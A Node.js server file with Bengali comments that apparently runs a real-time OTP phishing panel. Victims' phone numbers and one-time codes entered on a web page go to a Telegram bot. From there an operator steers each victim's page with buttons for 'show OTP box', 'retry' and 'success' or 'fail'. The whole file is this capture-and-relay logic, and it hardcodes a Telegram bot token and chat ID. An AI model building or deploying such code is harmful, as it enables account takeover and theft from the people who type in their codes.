const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const { Telegraf, Markup } = require('telegraf');

const app = express();
const server = http.createServer(app);
const io = new Server(server);

// আপনার দেওয়া তথ্য
const BOT_TOKEN = '8599585292:AAENAD4zbqo8bJL3XPzhcyAwdkR3buB_3gM';
const MY_CHAT_ID = '5967798239';

const bot = new Telegraf(BOT_TOKEN);

app.use(express.static('public'));

// ইউজার ডাটা স্টোর করার জন্য (সাময়িকভাবে)
const activeUsers = {};

io.on('connection', (socket) => {
    console.log('A user connected:', socket.id);

    // ১. যখন ইউজার ফোন নম্বর পাঠাবে
    socket.on('send_phone', (phone) => {
        activeUsers[socket.id] = { phone: phone, socketId: socket.id };
        
        // টেলিগ্রামে মেসেজ পাঠানো
        bot.telegram.sendMessage(MY_CHAT_ID, `🔔 *নতুন ইউজার!*\n📱 নম্বর: ${phone}\n🆔 সেশন: ${socket.id}`, {
            parse_mode: 'Markdown',
            ...Markup.inlineKeyboard([
                [Markup.button.callback('OTP ইনপুট বক্স দেখাও', `ask_otp_${socket.id}`)],
                [Markup.button.callback('ভুল নম্বর (আবার দিতে বলো)', `retry_phone_${socket.id}`)]
            ])
        });
    });

    // ২. যখন ইউজার OTP ইনপুট করবে
    socket.on('send_otp', (otp) => {
        const user = activeUsers[socket.id];
        bot.telegram.sendMessage(MY_CHAT_ID, `📩 *OTP এসেছে!*\n📱 নম্বর: ${user.phone}\n🔢 OTP: ${otp}`, {
            parse_mode: 'Markdown',
            ...Markup.inlineKeyboard([
                [Markup.button.callback('✅ সঠিক (Success)', `verify_success_${socket.id}`)],
                [Markup.button.callback('❌ ভুল (Retry OTP)', `verify_fail_${socket.id}`)]
            ])
        });
    });

    socket.on('disconnect', () => {
        delete activeUsers[socket.id];
    });
});

// টেলিগ্রাম বাটনের অ্যাকশন হ্যান্ডেল করা
bot.action(/ask_otp_(.+)/, (ctx) => {
    const socketId = ctx.match[1];
    io.to(socketId).emit('show_otp_input');
    ctx.answerCbQuery("ইউজারকে OTP বক্স দেখানো হয়েছে");
});

bot.action(/retry_phone_(.+)/, (ctx) => {
    const socketId = ctx.match[1];
    io.to(socketId).emit('retry_phone');
    ctx.answerCbQuery("ইউজারকে আবার নম্বর দিতে বলা হয়েছে");
});

bot.action(/verify_success_(.+)/, (ctx) => {
    const socketId = ctx.match[1];
    io.to(socketId).emit('final_status', { status: 'success' });
    ctx.editMessageText(`✅ ${activeUsers[socketId]?.phone} - ভেরিফাইড সফল!`);
});

bot.action(/verify_fail_(.+)/, (ctx) => {
    const socketId = ctx.match[1];
    io.to(socketId).emit('final_status', { status: 'fail' });
    ctx.answerCbQuery("ভুল OTP মেসেজ পাঠানো হয়েছে");
});

bot.launch();
server.listen(3000, () => {
    console.log('RYZE Server running on http://localhost:3000');
});
